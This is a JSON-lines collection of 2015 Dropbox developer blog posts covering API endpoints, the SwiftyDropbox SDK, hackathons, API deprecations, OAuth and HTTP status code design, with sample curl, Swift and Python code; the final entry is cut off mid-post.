{"website": "Dropbox", "title": "Programmatically saving a URL to Dropbox", "author": ["Jennifyit"], "link": "https://dropbox.tech/developers/programmatically-saving-a-url-to-dropbox", "abstract": "We've recently introduced a new feature to the Dropbox API: /save_url . This new endpoint lets app developers upload files to Dropbox by just providing a URL, without having to download the file first. It's analogous to the Dropbox Saver but works without any user interaction. To try out /save_url , you'll first need an OAuth access token, as you would to use any Core API endpoint. There are a number of ways to obtain an access token, and our OAuth guide will help you get started. Once you have an access token, calling /save_url is quite simple. Using curl : Copy curl https://api.dropbox.com/1/save_url/auto/images/downloaded.png \\\r\n-d url=\"https://dl.dropboxusercontent.com/s/deroi5nwm6u7gdf/advice.png\" \\\r\n-H \"Authorization: Bearer <ACCESS TOKEN>\" Note that the destination path is part of the URL. In the above case, it's /images/downloaded.png . The file to download is specified in the url form post parameter. The response will be JSON that looks like this: Copy {\"status\": \"PENDING\", \"job\": \"PEiuxsfaISEAAAAAAADw7g\"} The job ID can be used to periodically check a save URL job's status using the /save_url_job endpoint. For example: Copy curl https://api.dropbox.com/1/save_url_job/PEiuxsfaISEAAAAAAADw7g \\\r\n-H \"Authorization: Bearer <ACCESS TOKEN>\" Like /save_url, the response from a call to /save_url_job contains the current job status: Copy {\"status\": \"DOWNLOADING\"} When the job is completed successfully, the status field of the dictionary will have the value COMPLETE . For the full details of /save_url and /save_url_job , please refer to the save url API documentation . // Tags Developers Announcements Files // Copy link Link copied Link copied", "date": "2015-06-12"},
{"website": "Dropbox", "title": "SwiftyDropbox SDK talk video and sample app", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/swiftydropbox-sdk-talk-video-and-sample-app", "abstract": "A few weeks ago, I gave a talk at the Twilio Signal conference about our new SwiftyDropbox SDK. I demoed PhotoWatch , a sample app built with SwiftyDropbox that displays photos from your Dropbox on your Apple Watch. PhotoWatch uses two methods from the SwiftyDropbox SDK to interact with Dropbox: filesListFolder and filesDownload . Check out the source code on GitHub . // Tags Developers Announcements Sample Apps Swift // Copy link Link copied Link copied", "date": "2015-06-08"},
{"website": "Dropbox", "title": "Try out SwiftyDropbox, the new Swift SDK for Dropbox API v2!", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/try-out-swiftydropbox-the-new-swift-sdk-for-dropbox-api-v2", "abstract": "Add the SwiftyDropbox SDK to your project using CocoaPods Register a Dropbox API app Link an account Set up a URL scheme Try some API requests [EDIT June 18, 2015] Sample code for linking a user was updated to show how to check if a user has already been authorized. [EDIT June 3, 2015] This post has been updated to reflect the latest SwiftyDropbox SDK, v0.2. We recently announced our new API v2 , and now we're excited to bring you our first of many new SDKs for the new API... in Swift! A lot of iOS apps integrate with Dropbox already, and we think Swift is the programming language of the future when it comes to building iOS apps. SwiftyDropbox is an early preview of our Swift SDK for API v2, which helps you easily integrate Dropbox into your Swift app. In this blog post, we'll show you how to install SwiftyDropbox in your project and get started with a quick tutorial. Please keep in mind that both the SwiftyDropbox SDK and API v2 are still just preview versions and may change in the coming months, so please don't use this SDK in production yet. Let's get started! Add the SwiftyDropbox SDK to your project using CocoaPods You can either add the Dropbox Swift SDK to an existing project or create a new project in Xcode (just make sure you're using Xcode 6.3 or higher). First, you'll need to install the SwiftyDropbox SDK using CocoaPods . 1. Install CocoaPods: Copy sudo gem install cocoapods 2. If you've never used Cocoapods before, run: Copy pod setup 3. In your project directory, create a new file and call it \"Podfile\". Add the following text to the file: Copy platform :ios, '8.0'\r\nuse_frameworks!\r\n   \r\npod 'SwiftyDropbox', :git => 'git@github.com:dropbox/SwiftyDropbox.git', :tag => '0.2' 4. From the project directory, install the SwiftyDropbox SDK with: Copy pod install You’ll see that both SwiftyDropbox and Alamofire were installed. If your project is open in Xcode, you’ll need to close it and re-open the project workspace (.xcworkspace file) in Xcode for everything to work properly. Register a Dropbox API app To use the Dropbox API, you'll need to register a new app in the App Console . Select Dropbox API app and choose your app's permission. You'll need to use the app key created with this app to access API v2. That's it! You're ready to start using SwiftyDropbox. Link an account Now that the SDK is installed, you'll need to create a DropboxAuthManager to handle linking a user's Dropbox account with your app. A good place to create this object is in your app delegate's application(_:didFinishLaunchingWithOptions:) method. AppDelegate.swift Copy import UIKit\r\nimport SwiftyDropbox\r\n \r\n@UIApplicationMain\r\nclass AppDelegate: UIResponder, UIApplicationDelegate {\r\n \r\n    var window: UIWindow?\r\n \r\n    func application(application: UIApplication, didFinishLaunchingWithOptions launchOptions: [NSObject: AnyObject]?) -> Bool {\r\n \r\n        Dropbox.setupWithAppKey(\"APP_KEY\")\r\n \r\n        return true\r\n    }\r\n} Be sure to replace APP_KEY with the real app key for your app which can be found in the App Console . The next step is to link a user’s account. Make this call from an action, such as a “Link to Dropbox” button in your app. Copy @IBAction func linkButtonPressed(sender: AnyObject) {\r\n    if (Dropbox.authorizedClient == nil) {\r\n        Dropbox.authorizeFromController(self)\r\n    } else {\r\n        print(\"User is already authorized!\")\r\n    }\r\n} Now when the user clicks your button to connect with Dropbox, an in-app web browser will be displayed for them to log in to Dropbox and authorize your app. Once the user completes the authorization step, Dropbox will redirect them back to your app using a URL scheme. Set up a URL scheme 1. In order to complete the authorization process, you'll need to add a unique URL scheme that Dropbox can call: Click on your project in the Project Navigator, choose the Info tab, expand the URL Types section at the bottom, and press the + button. In the URL Schemes enter db-APP_KEY (replacing APP_KEY with the key generated when you created your app). 2. You'll also need to add code to handle the URL scheme, in your app delegate. AppDelegate.swift Copy func application(application: UIApplication, openURL url: NSURL, sourceApplication: String?, annotation: AnyObject?) -> Bool {\r\n     \r\n    if let authResult = Dropbox.handleRedirectURL(url) {\r\n        switch authResult {\r\n        case .Success(let token):\r\n            println(\"Success! User is logged into Dropbox.\")\r\n        case .Error(let error, let description):\r\n            println(\"Error: \\(description)\")\r\n        }\r\n    }\r\n \r\n    return false\r\n} Done! You can now run your app and test logging in with Dropbox. Try some API requests Now that your user is connected with a Dropbox account, you can try some API v2 calls using the SwiftyDropboxSDK! ViewController.swift Copy override func viewDidLoad() {\r\n    super.viewDidLoad()\r\n     \r\n    // Verify user is logged into Dropbox\r\n    if let client = Dropbox.authorizedClient {\r\n     \r\n        // Get the current user's account info\r\n        client.usersGetCurrentAccount().response { response, error in\r\n            if let account = response {\r\n                println(\"Hello \\(account.name.givenName)\")\r\n            } else {\r\n                println(error!)\r\n            }\r\n        }\r\n         \r\n        // List folder\r\n        client.filesListFolder(path: \"\").response { response, error in\r\n            if let result = response {\r\n                println(\"Folder contents:\")\r\n                for entry in result.entries {\r\n                    println(entry.name)\r\n                }\r\n            } else {\r\n                println(error!)\r\n            }\r\n        }\r\n         \r\n        // Upload a file\r\n        let fileData = \"Hello!\".dataUsingEncoding(NSUTF8StringEncoding, allowLossyConversion: false)\r\n        client.filesUpload(path: \"/hello.txt\", body: fileData!).response { response, error in\r\n            if let metadata = response {\r\n                println(\"Uploaded file name: \\(metadata.name)\")\r\n                println(\"Uploaded file revision: \\(metadata.rev)\")\r\n                 \r\n                // Get file (or folder) metadata\r\n                client.filesGetMetadata(path: \"/hello.txt\").response { response, error in\r\n                    if let metadata = response {\r\n                        println(\"Name: \\(metadata.name)\")\r\n                        if let file = metadata as? Files.FileMetadata {\r\n                            println(\"This is a file.\")\r\n                            println(\"File size: \\(file.size)\")\r\n                        } else if let folder = metadata as? Files.FolderMetadata {\r\n                            println(\"This is a folder.\")\r\n                        }\r\n                    } else {\r\n                        println(error!)\r\n                    }\r\n                }\r\n         \r\n                // Download a file\r\n                client.filesDownload(path: \"/hello.txt\").response { response, error in\r\n                    if let (metadata, data) = response {\r\n                        println(\"Dowloaded file name: \\(metadata.name)\")\r\n                        println(\"Downloaded file data: \\(data)\")\r\n                    } else {\r\n                        println(error!)\r\n                    }\r\n                }\r\n           \r\n            } else {\r\n                println(error!)\r\n            }\r\n        }\r\n    }\r\n} You can find all currently available user methods in Users.swift and file methods in Files.swift . // Tags Developers Announcements Swift // Copy link Link copied Link copied", "date": "2015-05-19"},
{"website": "Dropbox", "title": "VidComb and Dropbox at Video Hack Day", "author": ["Alexf2015"], "link": "https://dropbox.tech/developers/vidcomb-and-dropbox-at-video-hack-day", "abstract": "About VidComb Dropbox API demo Dropbox and the Developer Platform This weekend I had the pleasure of attending Video Hack Day in New York City as Dropbox's sponsor representative. It was hosted at General Assembly and organized by Ziggeo . Given that video is quickly becoming the content type of choice when it comes to communication, especially for the digital generation, it's no surprise that this event was buzzing with energy from hackers — all eager to make something awesome. After hacking all day, participants demoed their projects on Saturday night. There were hacks that aimed to make life easier for the visually impaired, hacks that help you get tutoring or language help with video, and hacks that enabled a variety of real-time video sharing scenarios, such as internet karaoke or sales pitches. As a sponsor, Dropbox got to give a prize for Best Use of the Dropbox API. Out of the many creative hacks, the winner we ultimately chose was VidComb , an app that takes the hassle out of making collaborative videos with your friends. This app clearly resonated with the audience as well, and VidComb also won the category for Crowd Favorite. The team went home with portable JBL speakers from Dropbox and $1,000 in cash from Video Hack Day. About VidComb For their demo, VidComb gave a delightful presentation about making surprise birthday videos for your friends. They showed how the app lets you create a video project, specifying whose birthday it is, and then invite friends to collaborate. Everyone then records or uploads a video from Dropbox. The app collects all the video contributions and the final video is automatically cut together and rendered — and the happy birthday montage is done! The VidCom team The VidComb team included Marilyn Chew (designer), Mikhail Gorbachev (developer), and Zhi An Ng (developer). Marilyn and Zhi An are from the National University of Singapore, now in New York for a year of internships through NUS Overseas College. They met Mikhail at Video Hack Day; all three are hackathon veterans. They bonded over the project idea, their love for surprising their friends, and their disdain for the tedious task of coordinating on group videos. Next up in the project's future is to add support for music and editing before final download — check out the github page here . Dropbox API demo In addition to giving prizes and hanging out with hackers, I also gave a short talk on the Dropbox API. For a demo, I showed how to get and use links to streaming video content (via /media ) and to sharable and downloadable video content (via /shares ). The end result was simple webpage and a python app that integrates with Dropbox - you can find the source code here . During my presentation, I used my sample app to generate links to a very special video that we made for Video Hack Day. Dropbox and the Developer Platform Thanks to everyone who made Video Hack Day possible, and a big thanks to everyone who tried their hand at adding a Dropbox integration to their project. I was very inspired by how each team accomplished so much in a single day, and I’m excited to hear about the awesome things you build next. // Tags Developers Developer Community Hackathon Sample Apps // Copy link Link copied Link copied", "date": "2015-05-14"},
{"website": "Dropbox", "title": "Search in Dropbox API v2", "author": ["Fengdropbox"], "link": "https://dropbox.tech/developers/search-in-dropbox-api-v2", "abstract": "Try it out! [EDIT June 4, 2015] This post has been updated to reflect the latest API v2 syntax. This year, Dropbox released Firefly , our instant, full text search for our Dropbox for Business users. We're excited to bring a full text search endpoint to developers as part of the Dropbox API v2 preview . Try it out! The search endpoint will accept query , path , start , max_results , and mode keys in a JSON object. The start parameter is for paging through search results. With the path parameter, you can limit results to only be within a certain folder. The mode parameter specifies the type of content to search and can be “filename”, “filename_and_content”, or “deleted_filename”. The search endpoint returns both filename and full-text search results for Dropbox for Business users, while other users will receive filename search results only. Remember that this is a preview version and should not be used in production. Endpoints will change as we gather feedback and continue to improve the preview of the API. Please let us know what you think in the comments or on our developer forum . files/search (RPC-style) Sample request: Copy curl -X POST https://api.dropboxapi.com/2/files/search \\\r\n  --header \"Authorization: Bearer \" \\\r\n  --header \"Content-Type: application/json\" \\\r\n  --data \"{\\\"path\\\":\\\"\\\", \\\"query\\\": \\\"bacon\\\"}\" Sample Response: Copy 200 OK\r\nContent-Type: application/json\r\n{\r\n  \"matches\": [\r\n    {\r\n      \"match_type\": { \".tag\": \"filename\" },\r\n      \"metadata\": {\r\n        \".tag\": \"filename\",\r\n        \"client_modified\": \"2015-04-08T03:07:23Z\",\r\n        \"name\": \"bacon.pptx\",\r\n        \"path_lower\": \"/bacon.pptx\",\r\n        \"rev\": \"c26a18d8270b\",\r\n        \"server_modified\": \"2015-04-08T03:07:53Z\",\r\n        \"size\": 1203\r\n      }\r\n    },\r\n    ...\r\n  ],\r\n  \"more\": true,\r\n  \"start\": 100\r\n} // Tags Developers Announcements Tips and Tricks Search // Copy link Link copied Link copied", "date": "2015-05-21"},
{"website": "Dropbox", "title": "Dropbox, keeping PyCon in sync!", "author": ["Fengdropbox"], "link": "https://dropbox.tech/developers/dropbox-keeping-pycon-in-sync", "abstract": "Dropbox was out in full force at PyCon this year. We were the Financial Aid Sponsor for the event, hosted a workshop about how to use the Dropbox API, and had a lot of great conversations with attendees at our booth. Behind the scenes, the Dropbox platform kept PyCon speakers and captioners in sync through a custom Dropbox API app. If you're curious about the Dropbox workshop, here are the slides and the full source code for PEP8 Squad, the demo app. PEP8 Squad reformats any Python file you drag into Dropbox according to PEP8's recommended style. Try it live here ! PyCon also used Dropbox's API to distribute speaker decks and closed captions. Speakers uploaded their slides to Dropbox, and then shared the slides with caption writers. Captions writers submitted their changes using the Dropbox platform app DBinbox , and the raw caption files were shared with PyCon attendees via a Dropbox share link ! If you're curious and would like to see the code, check out David Wolever's PyCon Slides project. // Tags Developers Developer Community Sample Apps Python // Copy link Link copied Link copied", "date": "2015-04-22"},
{"website": "Dropbox", "title": "The Next Web Hack Battle Dropbox API winners", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/the-next-web-hack-battle-dropbox-api-winners", "abstract": "Last week I traveled to Amsterdam for The Next Web Europe conference and Hack Battle hackathon. Dropbox sponsored the Hack Battle and awarded a prize for the most creative use of the Dropbox API. The winner of the Dropbox prize was Paratrooper, an app for sharing photos from a particular location. The members of the winning team were all from the Netherlands: Jan Deelstra , Tom de Vries , Luuk Hartsema , and Lars Bekkema . The winning team's day job is at HackerOne , where they work with friendly hackers to help organizations like Yahoo, Twitter, Dropbox, and even government agencies detect vulnerabilities in their own technology. Paratrooper team Here's how the team describes their hack: We wanted to build Paratrooper because it’s always a big hassle to manually collect all photos taken by you and your friends at a party, festival, or any other event you attend. Paratrooper automatically collects photos taken at the same location, during a certain time span. All photos taken with our app are automatically uploaded to a Shared Folder in Dropbox, where every contributor can collect the photos he or she likes. Paratrooper Dropshop Congratulations to everyone who participated in TNW Hack Battle and thanks to everyone who built a Dropbox hack. // Tags Developers Developer Community Hackathon Developer Spotlight // Copy link Link copied Link copied", "date": "2015-04-30"},
{"website": "Dropbox", "title": "Deprecating the Sync and Datastore APIs", "author": ["Smarxdropbox"], "link": "https://dropbox.tech/developers/deprecating-the-sync-and-datastore-apis", "abstract": "Why we're deprecating the Sync API Why we're deprecating the Datastore API Timeline Thank you [UPDATE March 24, 2016] The official date of retirement for the Datastore API is April 29th, 2016. Last week, we announced a preview of the new Dropbox API v2 , aimed at simplifying the experience of developing with Dropbox. As part of this effort to simplify our platform, we've decided to deprecate the Sync and Datastore APIs over the next 12 months. If you're one of the majority of developers using the Core API, your app will be unaffected. For those using the Sync or Datastore API, read on for details about the timeline and migration paths. As always, please don't hesitate to contact our team if you have questions or concerns. Why we're deprecating the Sync API A bit of history—in 2010, we announced our first API which supported basic file operations. The following year, we released an improved version, Core API v1 , which remains our most popular API to date. In early 2013, we launched the Sync API , a library for mobile developers aimed at making it easier to keep files in sync with Dropbox. The library is built on top of the Core API, and it's now deprecated in favor of using the Core API directly. We have two primary motivations for deprecating the Sync API now: The existence of multiple mobile SDKs/APIs to work with files has caused a wide range of developer confusion. It makes us sad to hear from developers who got started using one SDK only to later decide they actually needed to use the other. We'd like developers to have a single comprehensive SDK to use. While the goal of the Sync API was simplicity, the implementation is more complex, requiring our team to make trade-offs which made it hard to meet the needs of all developers. Like all development teams, we have limited resources. Without the resources to meet all possible syncing scenarios, we prefer to focus on providing the basic tools to allow developers to build the syncing solution they need. We're continuing to build and improve our Core API and are excited to be working on a new version: API v2 , which aims to make development on the Dropbox platform simpler and easier. We look forward to sharing new SDKs built on API v2 in the coming months, and we'll publish tips for building sync-style applications on top of the new SDKs. Why we're deprecating the Datastore API We added the Datastore API in the summer of 2013 to support syncing structured (non-file) data with Dropbox. The Sync API and Datastore API are both part of the same mobile SDKs. Since its launch almost two years ago, the Datastore API hasn't seen the adoption we had hoped for. While some developers have adopted this API and loved it, the raw numbers show that it wasn't used by very many apps. The Datastore API is somewhat unique in that it, unlike the Core API, deals with non-file data, so we're working directly with individual developers to help them migrate to an alternative. Existing apps built using the Datastore API will continue to work in the meantime. In the hopes that it is useful to others, today we've released the JavaScript Datastore SDK as open source on GitHub , as a reference implementation for handling sync and conflict resolution. For the basics on how the Datastore API handles conflicts, read these two blog posts from 2013: Part 1 and Part 2 . Timeline As of today, new Dropbox apps should use our Core API . Over the next six months, we'll continue to implement urgent bug fixes as needed to the Sync and Datastore SDKs, but we are no longer actively developing them. In October 2015, we will discontinue support for the deprecated SDKs entirely. Since the Sync SDK is built on the Core API, existing apps will continue to work, but we encourage developers to move to one of the Core SDKs as soon as possible. For existing apps using the Datastore API, the data and HTTP endpoints will be available for the next 12 months, until April 2016. Thank you We are grateful for all of the developers who use our platform. Building a trustworthy, useful, and coherent platform is always our goal, and your feedback helps steer us in the right direction. We hope you agree that focusing on a single API and a single set of SDKs makes the Dropbox platform better. We welcome your feedback in the comments here or on the Dropbox API development forum . // Tags Developers Announcements Deprecation // Copy link Link copied Link copied", "date": "2015-04-23"},
{"website": "Dropbox", "title": "A guide to getting started with OAuth", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/a-guide-to-getting-started-with-oauth", "abstract": "A common sticking point for developers when they begin using the Dropbox API is how to properly authorize users using OAuth. Dropbox uses OAuth 2 , an open standard, to handle connecting apps to users' Dropbox accounts. To help developers get started, we just published the Dropbox API OAuth guide , covering OAuth and user authorization in general. Check it out and let us know what you think, either here in the comments or on the Dropbox API development forum . // Tags Developers Guide Tips and Tricks Oauth // Copy link Link copied Link copied", "date": "2015-04-21"},
{"website": "Dropbox", "title": "Get Easter eggs in your Dropbox", "author": ["Alexf2015"], "link": "https://dropbox.tech/developers/get-easter-eggs-in-your-dropbox", "abstract": "Some people think that Easter eggs are colorful hard-boiled chicken ova that you hide in a backyard once a year. Other people think Easter eggs are cute little surprises that developers build into their apps to delight their users. With the Dropbox API, Easter eggs can be both! Who knows where they'll be? The Easter Eggs app creates a folder tree in your Dropbox with folders like \"grass\" and \"drain pipe\" and \"under the back porch,\" and then randomly adds image files of eggs. The aim of the game is to find all the eggs and drag the files to your \"Easter basket\" folder. Making API calls to create the whole folder structure for the yard might sound like a lot of work, since there's a folder for every possible hiding place. One trick is to use /copy_ref . Rather than writing code to manually create each folder for each user who links their account, copy_ref lets you copy the contents from a pre-existing folder or file on another Dropbox account. It's much easier to manually create a custom folder hierarchy once, and then copy it many times. Plus, the cool thing about using a copy_ref on a folder is that it copies the whole thing—instant file tree! Copy dropbox-tech-blog/components/content/image It also uses /delta to create a flat list of of folders in the Yard, which makes it easy to pick random hiding places for the eggs. Copy def enumerate_yard(path, client):\r\n    cursor = None\r\n    has_more = True\r\n \r\n    paths = set()\r\n    while has_more:\r\n        response = client.delta(path_prefix=path, cursor=cursor)\r\n        for path, metadata in response['entries']:\r\n            paths.add(path)\r\n        has_more = response['has_more']\r\n \r\n    return paths\r\n \r\n...\r\n \r\n# Get flat list of paths to directories from '/Yard'\r\nflat_list = enumerate_yard('/Yard', client)\r\n \r\n# Choose 5 random places to hide eggs\r\nhiding_places = random.sample(flat_list, 5) The app is available at easter-eggs.herokuapp.com . It uses /copy_ref , /delta , and /metadata . Happy hunting! // Tags Developers Sample Apps Tips and Tricks // Copy link Link copied Link copied", "date": "2015-04-03"},
{"website": "Dropbox", "title": "A preview of the new Dropbox API v2", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/a-preview-of-the-new-dropbox-api-v2", "abstract": "What's different? Try it out! Endpoints [EDIT June 3, 2015] This post has been updated to reflect the latest API v2 syntax. We've been working on a new version of the Dropbox API for a while and it's time to show you what we have so far. To start, we've implemented a select set of endpoints that highlight the big structural changes underway, and we'd like to know what you think! What's different? Overall, we've simplified our use of HTTP. For example, most endpoints always use HTTP POST, including those that return structured data. Requests take JSON in the body and responses return JSON in the body. We will continue to use other HTTP features in specific cases where they provide concrete benefits. For example, endpoints that return bulk binary data (e.g. file contents) support HTTP GET and ETag-based caching . This allows browsers and HTTP client libraries to transparently cache that data for you. We've also simplified our use of HTTP status codes for errors. For errors that are common to all API calls, we do the same thing as before: 400 for bad request, 401 for auth failure, 429 for rate limiting, etc. But if a request fails for some call-specific reason, v1 might have returned any of 403, 404, 406, 411, etc. API v2 will always return a 409 status code with a stable and documented error identifier in the body. We chose 409 because, unlike many other error codes, it doesn't have any specific meaning in the HTTP spec. This ensures that HTTP intermediaries, such as proxies or client libraries, will relay it along untouched. With these changes, we hope to make the Dropbox API easier to understand. We also hope to make it easier for developers to build apps and to create SDKs. By releasing a new version of the API, we also have the ability to part ways with old, deprecated endpoints and response fields. For example, OAuth 1.0 is no longer supported in API v2. It's always nice to clean things up a bit! Try it out! We have five endpoints you can actually try out right now (see Endpoints below). You'll need an OAuth 2 access token to make API calls. If you don't have one already, it's easy to generate one for your own account . To actually make the API calls, you have a few options: Use our Python REPL script . Use the Paw REST client app for Mac with our Paw configuration file . Replace \"ACCESS_TOKEN\" with your generated access token. Use whatever you want! It's just HTTP. Please remember that this is a beta version and things may change. Don't use these API endpoints in production yet. We're interested in your feedback, so let us know what you think in the comments or on our developer forum . Endpoints There are three categories of endpoints. RPC-style: The request and response bodies are both JSON. Upload-style: The request has JSON in the Dropbox-API-Arg header and bulk binary data in the body. The response body is JSON. Download-style: The request uses the GET method and has JSON in the Dropbox-API-Arg header and nothing in the body. The response has JSON in the Dropbox-API-Result header and bulk binary data in the body. users/get_current_account (RPC-style) Sample request: Copy curl -X POST <a class=\"vglnk\" href=\"https://api.dropboxapi.com/2/users/get_current_account\" rel=\"nofollow\"><span>https</span><span>://</span><span>api</span><span>.</span><span>dropboxapi</span><span>.</span><span>com</span><span>/</span><span>2</span><span>/</span><span>users</span><span>/</span><span>get</span><span>_</span><span>current</span><span>_</span><span>account</span></a> \\\r\n    --header \"Authorization: Bearer <access-token>\" \\\r\n    --header \"Content-Type: application/json\" \\\r\n    --data \"null\" Sample response: Copy 200 OK\r\nContent-Type: application/json\r\n \r\n{\r\n  \"account_id\": \"dbid:AADjaKS0RWKMfS_-Tf88LFVeMUbWOlUjR9U\",\r\n  \"name\": {\r\n    \"given_name\": \"Panda\",\r\n    \"surname\": \"Bamboo\",\r\n    \"familiar_name\": \"Panda\",\r\n    \"display_name\": \"Panda Bamboo\"\r\n  },\r\n  \"email\": \"panda@example.com\",\r\n  ...\r\n} files/get_metadata (RPC-style) Sample request: Copy curl -X POST <a class=\"vglnk\" href=\"https://api.dropboxapi.com/2/files/list_folder\" rel=\"nofollow\"><span>https</span><span>://</span><span>api</span><span>.</span><span>dropboxapi</span><span>.</span><span>com</span><span>/</span><span>2</span><span>/</span><span>files</span><span>/</span><span>list</span><span>_</span><span>folder</span></a> \\\r\n    --header \"Authorization: Bearer <access-token>\" \\\r\n    --header \"Content-Type: application/json\" \\\r\n    --data \"{\\\"path\\\": \\\"\\\"}\" Sample response: Copy 200 OK\r\nContent-Type: application/json\r\n \r\n{\r\n  \"cursor\": \"...\",\r\n  \"entries\": [\r\n    {\".tag\": \"file\", \"name\": \"cupcake.png\", ... },\r\n    {\".tag\": \"folder\", \"name\": \"recipes\", ... },\r\n    {\".tag\": \"file\", \"name\": \"ingredients.xlsx\", ... },\r\n    ...\r\n  ],\r\n  \"has_more\": false\r\n} files/upload (upload-style) Note that the upload file size is limited to 150 MB. New API endpoints for uploading larger files (in chunks) are coming soon. Sample request: Copy 200 OK\r\nContent-Type: application/json\r\n \r\n{\r\n  \"client_modified\": \"2015-03-26T21:31:57Z\",\r\n  \"name\": \"cupcake.png\",\r\n  \"path_lower\": \"/cupcake.png\",\r\n  \"rev\": \"8e941b183490\",\r\n  \"server_modified\": \"2015-03-26T21:31:57Z\",\r\n  \"size\": 59704\r\n} files/download (download-style) Sample request: Copy curl -X POST https://api.dropboxapi.com/2/files/get_metadata \\ \r\n        --header \"Authorization: Bearer <access-token>\" \\ \r\n        --header \"Content-Type: application/json\" \\ --data \"{\\\"path\\\": \\\"/cupcake.png\\\"}\" Sample response: Copy 200 OK\r\nDropbox-API-Result: {\"name\": \"cupcake.png\",  ... } // Tags Developers Announcements Tips and Tricks Preview // Copy link Link copied Link copied", "date": "2015-04-08"},
{"website": "Dropbox", "title": "How many HTTP status codes should your API use?", "author": ["Smarxdropbox"], "link": "https://dropbox.tech/developers/how-many-http-status-codes-should-your-api-use", "abstract": "The value of HTTP status codes Are API clients web browsers? What about the humans? A pragmatic, minimalist approach There are a lot of HTTP status codes. At the time of this writing, Wikipedia lists 75 different status codes , most of which you've probably never encountered. Many of us have heard of the tongue-in-cheek \" 418 I'm a teapot ,\" but very few are familiar with these: 205 Reset Content 300 Multiple Choices 419 Authentication Timeout 450 Blocked by Windows Parental Controls Most API providers stick to a rather small set of status codes, which they list in their documentation. Facebook's Graph API takes this to the extreme; it only returns a single status code: 200 (OK). A client can determine whether an error occurred by examining the JSON-encoded response body. The Twitter API documents 15 status codes . Our own Dropbox API lists 8 specific status codes for error conditions. What's the right approach? Is it better to use more status codes or fewer status codes? The value of HTTP status codes There are 16 status codes defined in RFC1945 (the HTTP 1.0 specification) . These status codes were motivated by pragmatism. Web browsers are generic, in that they can be used to talk to any web server. That means both the web browser and web server need to conform to a known interface, and this interface includes a variety of error conditions. For example, web browsers need to know when to prompt a user for credentials, and that's why we have status code 401 (Unauthorized). Newer status codes serve similar purposes. For example, 206 (Partial Content) exists to let a browser know that its range retrieval request was actually fulfilled, so it should treat the content as such. (In contrast, a 200 status code would indicate that the server actually returned the full content.) The value to a web browser of a standard set of status codes is that the browser can automatically —without any foreknowledge of the specific web server it's talking to—take the right action. Over the decades, this value has extended to things that aren't exactly web browsers. For example, a caching proxy server uses conditional GET requests and relies on an understanding of status code 304 (Not Modified) to know when it's safe to use the cached value. Are API clients web browsers? To get back to the titular question of this post, we need to think about what API clients do and do not have in common with web browsers. Some parts of API clients are very similar to web browsers, in that they're generic and have an understanding of common status codes. Here's an illustration in Python: Copy >>> import requests\r\n>>> requests.get('http://httpstat.us/302').status_code\r\n200 The URL http://httpstat.us/302 actually returns a 302 (Found), with a Location header of http://httpstat.us . Just like a web browser, the requests library has an understanding of the 302 status code and knows how to act accordingly. In the exchange above, it followed the redirect, made a second HTTP request, and then returned the 200 OK it received from that request. In other aspects, API clients are often not generic at all. A good Twilio library might understand error 21610 (\"Message cannot be sent to the 'To' number because the customer has replied with STOP\"), but there's no such thing as a generic API client that understands that error. For these bespoke errors, most API providers (including Twilio) pick one HTTP status code—often 400 (Bad Request)—and use the response body to elaborate on the specific error encountered. To the extent that API clients are generic and capable of responding to standard status codes, using those status codes provides value. To the extent that API clients are specifically designed to work with a single API, the use of particular status codes is a matter of taste. What about the humans? Speaking of taste, it's important to remember that API design isn't strictly about the practical implications on client and server software. The audience for an API is the developer who is going to consume it. Per the \" principle of least astonishment ,\" developers will have an easier time learning and understanding an API if it follows the same conventions as other APIs they're familiar with. This is, of course, a moving target. There was a time when Rails-style plural URLs ( /people and /person/123 ) were the style everyone emulated, but that convention no longer seems as common. Twitter ushered in an era of /foo.json and /foo.xml for a time, but it seems more fashionable these days to use content negotiation . HTTP status codes are similar. Beyond a certain point, the use (or not) of specific status codes is a matter of personal preference and expectation. Keep your specific audience in mind and listen carefully to their feedback. A pragmatic, minimalist approach HTTP status codes are grouped into five numeric categories: 1xx – informational 2xx – successful 3xx – redirection 4xx – client error 5xx – server error Those categories are broadly understood by many types of clients. For example, popular HTTP libraries in a number of languages already treat a 4xx/5xx status as an error and throw an exception. API consumers will see immediate value from status codes organized this way. Here are some common specific status codes that will provide immediate value when applicable. Note that each allows a generic client to take action on them: 302 Found (and perhaps the other redirect codes) – Supporting this status code will let clients follow a redirect, which can be particularly useful when you need to reroute a request to another host. 304 Not Modified – Supporting this status code, along with conditional GET requests ( ETag / If-None-Match , Date / If-Modified-Since ), will let clients and proxies cache responses. This is particularly important for JavaScript running in the browser, but other clients support this too, including OkHttp on Android and AFNetworking on iOS. 429 Too Many Requests – Supporting this status code, along with the Retry-After header, will let clients perform automatic backoff in the case of rate-limiting. Following this pragmatic approach, APIs should probably use at least 3 status codes (e.g. 200, 400, 500) and should augment with status codes that have specific, actionable meaning across multiple APIs. Beyond that, keep your particular developer audience in mind and try to meet their expectations. In that spirit, we'd love to hear what you think. Dropbox currently uses about 10 different status codes (8 errors and 2 for success), but we're planning to reduce that number in a future version of the API. Please share your thoughts here in the comments. // Tags Developers Http Tips Tricks Deep Dives // Copy link Link copied Link copied", "date": "2015-04-01"},
{"website": "Dropbox", "title": "JSON in URLs", "author": ["Api Developer"], "link": "https://dropbox.tech/developers/json-in-urls", "abstract": "URL paths are complicated URL query parameters are not as expressive Is URL encoding just bad? So what's the problem? HTTP-based APIs often encode arguments as URL path and query parameters. For example, a call to the Dropbox API’s filename search endpoint might look like: Copy /1/search/auto/My+Documents?query=draft+2013 While URL encoding seems fine for simple examples, using JSON might have some advantages. URL paths are complicated In the example above, the first \"+\" is a literal plus sign because it's in the URL. The second \"+\" represents a space because it's in the URL query component. It's easy to confuse the two since the encoding rules are mostly the same and sometimes the library functions are name something ambiguous like \"urlencode\". An early version of one of our SDKs had a bug because of this. Another common mistake is assuming that a \"/\" in the path component is just like any other character. \" /hello-world \" is equivalent to \" /hello %2D world \" \" /hello/world \" is not equivalent to \" /hello %2F world \" The \"/\" character is a reserved delimiter . Changing it to its percent-encoded form can change the meaning of the URL. Most URL encoding libraries don't make it clear how important the distinction can be. They get away with this because a lot of the time it doesn't matter. However, sometimes it matters a lot . URL query parameters are not as expressive What if one of your API call arguments is a list of values? Some APIs handle this by using commas or repeated names. Copy /docs/salary.csv?columns=1,2\r\n/docs/salary.csv?column=1&column=2 And for nested object fields, some APIs do things like: Copy 